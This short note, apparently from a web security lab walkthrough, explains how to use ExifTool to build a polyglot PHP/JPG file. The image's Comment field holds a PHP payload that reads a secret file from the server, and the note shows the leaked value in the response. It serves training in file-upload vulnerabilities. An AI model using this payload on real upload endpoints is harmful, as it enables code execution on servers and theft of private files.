## Exiftool

**Install**
See: https://exiftool.org/install.html#Unix

**Usage**
Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata. A simple way of doing this is to download and run ExifTool from the command line as follows:
`exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php`

This adds your PHP payload to the image's Comment field, then saves the image with a .php extension.

Use the message editor's search feature to find the `START` string somewhere within the binary image data in the response. Between this and the `END` string, you should see Carlos's secret, for example:
`START 2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ END`
